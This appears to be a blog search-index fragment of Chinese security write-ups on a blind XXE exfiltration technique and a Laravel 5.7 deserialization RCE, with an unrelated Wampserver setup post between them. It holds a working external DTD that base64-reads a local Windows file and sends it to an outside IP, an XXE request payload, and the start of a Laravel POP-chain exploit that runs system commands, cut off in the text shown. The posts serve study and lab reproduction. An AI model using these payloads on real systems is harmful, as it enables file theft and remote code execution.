+<li>首先我们在在本地上传一个<code>test2.dtd</code>文件<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///C:/Windows/system.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://10.3.131.118:1111?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+这里我们用到了参数实体，顺便写一下两种实体的区别</li>
+</ul>
+<ol>
+<li>通用实体<br>用 <code>&amp;实体名;</code>，引用的实体（例如上面的<code>&amp;xxe;</code>），他在DTD 中定义，在 XML 文档中引用<blockquote>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>参数实体：<ol>
+<li>使用 % 实体名(这里面空格不能少) 在 DTD 中<strong>定义</strong>，并且只能在 DTD 中使用<code>%实体名;</code> <strong>引用</strong></li>
+<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
+<li>和通用实体一样，参数实体也可以外部引用<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote-dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">localhost</span>/<span class="attr">test.dtd</span>"&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p>
+</blockquote>
+</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li>接下来我们来构造POC<br>参数c是我们要实例化的类：<code>c=SimpleXMLElement</code><br>构造函数存在2个参数，第一个当然是data，第二个是options；options这里我们选择<code>LIBXML_NOENT</code>，预设值为2<br><img src="LIBXML_NOENT.png" alt="LIBXML_NOENT"><br>XML的内容：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://10.3.131.118/test2.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br></pre></td></tr></table></figure>
+接下来在本地用NC开启监听，不出意外我们会收到请求<br><img src="result.png" alt="result"><br>也可以将dtd中的端口改为Web端口，然后再apache查看日志即可<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1>其实还有一部分知识点没有写完，先在这里留个坑好了，过几天补充剩下的。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次在wamper64中增加php遇到的问题</title>
+    <url>/2020/01/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9C%A8wamper64%E4%B8%AD%E5%A2%9E%E5%8A%A0php%E7%89%88%E6%9C%AC%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<p>在wamper64中手动增加php版本碰到了不少问题，记录总结一下</p>
+<a id="more"></a>
+<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>因为要复现joomla3.4.6的一个RCE，php要求在5.6.13下才行，我的wamper自带的php5只有5.6.40，所以需要我手动安装一个低版本</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>一开始我找我的小伙伴要了他的phpstudy下的php5.3.29，按照网上的方法配置好后wamper是橘色的，一看果然有个服务没启动，于是我查看后发现是apache没有正常启动，<br>查看了一下错误日志后发现是php目录下的wampserver.conf文件内容出了问题<br>最后定位到第9行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phpConf[<span class="string">'phpIniDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpExeDir'</span>] = <span class="string">'.'</span>;</span><br><span class="line">$phpConf[<span class="string">'phpConfFile'</span>] = <span class="string">'php.ini'</span>;</span><br><span class="line"><span class="comment">//PHP 5.6.x needs Apache 2.4.x and doesn't works with Apache 2.2.x</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleName'] = 'php5_module';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['LoadModuleFile'] = 'php5apache2_2.dll';</span></span><br><span class="line"><span class="comment">//$phpConf['apache']['2.2']['AddModule'] =  '';</span></span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleName'</span>] = <span class="string">'php5_module'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'LoadModuleFile'</span>] = <span class="string">'php5apache2_4.dll'</span>;</span><br><span class="line">$phpConf[<span class="string">'apache'</span>][<span class="string">'2.4'</span>][<span class="string">'AddModule'</span>] =  <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<ul>
+<li>显然是php5apache2_2.dll这个dll加载失败了。我想起小伙伴传给我的php文件里是没有这个dll的，这个dll是我从自己的php5.6.40拷贝过来的，我仔细看了一下他传给我的文件叫：<code>php5.3.29nts.rar</code>，我去查了一下nts的含义，果然是php版本的问题，官方的解释是这样的：<br>NTS全称：<code>Non Thread Safe</code>，TS是指具有多线程功能的构建。NTS仅指单线程构建。TS二进制文件的用例涉及与多线程SAPI和作为模块加载到Web服务器的PHP的交互。对于NTS二进制文件，广泛的用例是通过FastCGI协议与Web服务器进行交互，而不使用多线程（例如CLI）。</li>
+<li>如果你要使用apache，则需要使用TS版本；如果是IIS，则使用NTS等等<br>所以我又去下了一个5.3.29TS版本，下载好安装完成，却发现目录下没有<code>php5apache2_4.dll</code>而是<code>php5apache2_2.dll</code>，后来我看到wampserver.conf下第7行：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//PHP 5.6.x needs Apache 2.4.x and doesn&apos;t works with Apache 2.2.x</span><br></pre></td></tr></table></figure>
+而且我的wamper中只有一个apache2.4版本的，所以需要重新下个版本稍高点的</li>
+</ul>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>总结一下需要更改的配置文件</p>
+<ol>
+<li>将你的任意版本php下的php.ini复制到新php目录下，并替换其中的版本号</li>
+<li>(本例中)将php5版本下的wampserver.conf复制到新php目录下，具体改的地方要看实际情况</li>
+<li>将你的任意版本php下的phpForApache.ini复制到新php目录下，替换其中的版本号</li>
+<li>打开wamper的配置文件<code>{wamper安装路径}/wampmanager.ini</code>，全局搜索<code>[phpversion]</code></li>
+</ol>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[phpVersion]</span></span><br><span class="line"><span class="comment">;WAMPPHPVERSIONSTART</span></span><br><span class="line">Type: item; Caption: "5.6.11"; Action: multi; Actions:switchPhp5.6.11; Glyph: 13</span><br><span class="line">Type: item; Caption: "5.6.40"; Action: multi; Actions:switchPhp5.6.40</span><br><span class="line">Type: item; Caption: "7.0.33"; Action: multi; Actions:switchPhp7.0.33</span><br><span class="line">Type: item; Caption: "7.1.29"; Action: multi; Actions:switchPhp7.1.29</span><br><span class="line">Type: item; Caption: "7.2.18"; Action: multi; Actions:switchPhp7.2.18</span><br><span class="line">Type: item; Caption: "7.3.5"; Action: multi; Actions:switchPhp7.3.5</span><br><span class="line"><span class="section">[switchPhp5.6.11]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.11";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp5.6.40]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 5.6.40";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br><span class="line"><span class="section">[switchPhp7.0.33]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "switchPhpVersion.php 7.0.33";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "D:/Wampserver/bin/php/php5.6.40/php-win.exe";Parameters: "refresh.php";WorkingDir: "D:/Wampserver/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在<code>;WAMPPHPVERSIONSTART</code>下方插入:<code>Type: item; Caption: &quot;{你的版本号}}&quot;; Action: multi; Actions:switchPhp{你的版本号}</code></p>
+</li>
+<li><p>接下来在<code>[switchPhpx.x.xx]</code>前插入</p>
+</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">[switchPhp&#123;你的版本号&#125;]</span></span><br><span class="line">Action: service; Service: wampapache64; ServiceAction: stop; Flags: ignoreerrors waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/php/php&#123;你的版本号&#125;/php-win.exe";Parameters: "switchPhpVersion.php &#123;你的版本号&#125;";WorkingDir: "&#123;安装路径&#125;scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/bin/php/php&#123;你的版本号&#125;/php.exe";Parameters: "switchMysqlPort.php 3306";WorkingDir: "&#123;安装路径&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "&#123;安装路径&#125;/bin/php/php&#123;你的版本号&#125;/php-win.exe";Parameters: "refresh.php";WorkingDir: "&#123;安装路径&#125;/scripts"; Flags: waituntilterminated</span><br><span class="line">Action: run; FileName: "net"; Parameters: "start wampapache64"; ShowCmd: hidden; Flags: waituntilterminated</span><br><span class="line">Action: resetservices</span><br><span class="line">Action: readconfig</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更改完成后退出wamper64，然后重启各项服务就🆗了</li>
+</ul>
+]]></content>
+      <categories>
+        <category>apache</category>
+      </categories>
+      <tags>
+        <tag>wamper64</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Laravel5.7反序列化RCE漏洞分析</title>
+    <url>/2020/03/06/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前只是粗略的知道反序列化漏洞的原理，最近在学习Laravel框架的时候正好想起以前收藏的一篇反序列化RCE漏洞，借此机会跟着学习一下POP链的挖掘</p>
+<a id="more"></a>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Laravel是一个使用广泛并且优秀的PHP框架。这次挖掘的漏洞Laravel5.7版本，该漏洞需要对框架进行二次开发才能触发该漏洞</p>
+<h1 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h1><ul>
+<li>Laravel5.7.28</li>
+<li>Wamper64+PHP7.3.5（PHP &gt;= 7.1.3）<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2></li>
+</ul>
+<ol>
+<li>使用composer部署Laravel项目<ul>
+<li>创建一个名为laravel的Laravel项目<br><code>composer create-project laravel/laravel=5.7.* --prefer-dist ./</code></li>
+<li>Laravel框架为单入口，入口文件为<code>{安装目录}/public/index.php</code>，使用apache部署后访问入口文件显示<em>Laravel欢迎界面</em>即安装成功（或者使用命令<code>php artisan serve</code>开启临时的开发环境的服务器进行访问）</li>
+</ul>
+</li>
+<li>配置路由以及控制器<ul>
+<li>Laravel所有的用户请求都由路由来进行控制。我们添加一条如下的路由<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> \<span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the "web" middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 添加的路由</span></span><br><span class="line">Route::get(<span class="string">'/test'</span>, <span class="string">'Test\TestController@Test'</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>控制器中<code>Test</code>函数实现反序列化功能：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Laravel5.7版本在<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing</code>文件夹下增加了一个<code>PendingCommand</code>类，官方的解释该类主要功能是用作命令执行，并且获取输出内容。<br>该类中几个重要属性：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> $test;           <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line"><span class="keyword">protected</span> $app;         <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line"><span class="keyword">protected</span> $command;     <span class="comment">//要执行的php函数 system</span></span><br><span class="line"><span class="keyword">protected</span> $parameters;  <span class="comment">//要执行的php函数的参数  array('id')</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用于命令执行的函数为<code>PendingCommand.php</code>中的<code>run()</code>函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span> . $e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion() . <span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode,</span><br><span class="line">                $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li><code>run()</code>函数被析构函数<code>__destruct()</code>调用<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+简单的POP链为：构造的exp经过反序列化后调用<code>__destruct()</code>，进而调用<code>run()</code>,<code>run()</code>进行代码执行。下面进行详细的分析</li>
+<li>首先将构造好的序列化数据通过参数C传入，调用<code>__destruct()</code>，<code>__destruct()</code>方法中首先判断<code>$hasExecuted</code>，如果为<code>true</code>则return，可以看到该变量默认值为<code>false</code>，所以可以顺利进入<code>run()</code>方法`<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if command has executed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hasExecuted = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></li>
+<li>观察run()方法内的代码，我们要让代码顺利执行到<code>run()</code>处才能顺利执行代码。首先进入<code>mockConsoleOutput()</code>方法</li>
+</ul>
+<p><img src="run.png" alt="run"></p>
+<ul>
+<li>171行使用<code>Mockery::mock</code>实现对象模拟，经过调试可以顺利运行，接下来进入<code>mockConsoleOutput()</code>函数</li>
+</ul>
+<p><img src="mockConsoleOutput.png" alt="mockConsoleOutput"></p>
+<ul>
+<li>接下来又是<code>Mockery::mock</code>实现对象模拟，经过调试代码可以顺利运行到<code>foreach</code>，<code>foreach</code>循环里的代码是<code>$this-&gt;test-&gt;expectedOutput</code>，这里对<code>$this-&gt;test</code>类的<code>expectedOutput</code>属性<br>进行遍历作为数组，代码才能正常执行下去。但是该类并不存在<code>expectedOutput</code>属性；经过分析代码，我们发现这里只要能够返回一个数组代码就可以顺利进行下去。</li>
+</ul>
+<p><img src="createABufferedOutputMock.png" alt="createABufferedOutputMock"></p>
+<ul>
+<li>因此我们全文搜索<code>__get()</code>方法，让<code>__get()</code>方法返回我们想要的数组就可以了。这里我选择的是<code>DefaultGenerator.php</code>类</li>
+</ul>
+<p><img src="get.png" alt="get"></p>
+<ul>
+<li>我们对<code>DefaultGenerator</code>类进行实例化并传入数组<code>array(&#39;hello&#39;=&gt;&#39;world&#39;)</code>，打断点进行调试可以看到代码顺利执行下去了</li>
+</ul>
+<p><img src="get1.png" alt="get1"><br><img src="get2.png" alt="get2"></p>
+<ul>
+<li>后面的代码都是可以顺利执行下去的，接下来我们又回到了<code>mockConsoleOutput()</code>方法内，接下来又是一个<code>forearch</code>循环，如上一步的遍历数组一样，顺利执行下去</li>
+</ul>
+<p><img src="get3.png" alt="get3"></p>
+<ul>
+<li><p>接下来代码会执行到<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>，其中<code>Kernel::class</code>为固定值：<code>&quot;Illuminate\Contracts\Console\Kernel&quot;</code>，在该处下断点进行调试分析下面的调用栈</p>
+<blockquote>
+<p>→ offsetGet(),$key=”Illuminate\Contracts\Console\Kernel”<br><img src="offsetGet.png" alt="offsetGet"><br>→ make(),$abstract=”Illuminate\Contracts\Console\Kernel”<br><img src="make.png" alt="make"><br>→ make():父类的<code>make()</code>,$abstract=”Illuminate\Contracts\Console\Kernel”,$parameters=array(0)<br><img src="make1.png" alt="make1"></p>
+</blockquote>
+</li>
+<li><p>其中<code>return $this-&gt;instances[$abstract];</code>=<code>$this-&gt;instances[&quot;Illuminate\Contracts\Console\Kernel&quot;]</code>也就是返回了<code>Illuminate\Foundation\Application</code>对象；即我们可以将任意对象赋值给 $this-&gt;instances[$abstract] ，这个对象最终会赋值给<code>[Kernel::class]</code> ，接着调用<code>call()</code>方法</p>
+<blockquote>
+<p>→ resolve(),$abstract=”Illuminate\Contracts\Console\Kernel”，instances数组中为Application对象<br><img src="resolve.png" alt="resolve"></p>
+</blockquote>
+</li>
+<li><p>下面我们成功的执行到了<code>call()</code>方法，</p>
+<blockquote>
+<p>→call()<br><img src="call.png" alt="call"></p>
+</blockquote>
+</li>
+<li><p>其中<code>isCallableWithAtSign()</code>方法是判断确定给定的字符串是否使用<code>Class@method</code>语法，不满足自然跳出，执行到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>→BoundMethod::call()<br><img src="call1.png" alt="call1"></p>
+</blockquote>
+</li>
+<li><p>我们来分析一下<code>callBoundMethod()</code>函数，可以发现它的作用只是判断<code>$callback</code>是否为数组</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">callBoundMethod</span><span class="params">($container, $callback, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_array($callback)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default <span class="keyword">instanceof</span> Closure ? $default() : $default;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>继续跟进下面的匿名函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>$callback</code>参数是我们可控的，第二个参数由函数<code>getMethodDependencies()</code>控制，我们跟进看一下<br><img src="call2.png" alt="call2"></p>
+</li>
+<li><p>经过调试，得出结论：它将我们传入的<code>$parameters</code>数组和$<code>dependencies</code>数组合并，其中<code>$dependencies</code>数组为空，而<code>$parameters</code>数组是我们可控的。最终也就是执行了<code>call_user_func_array(&#39;xxx&#39;,array(&#39;xxx&#39;))</code></p>
+</li>
+</ul>
+<h1 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h1><p>exp文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;     <span class="comment">//要执行的php函数的参数  array('id')</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> 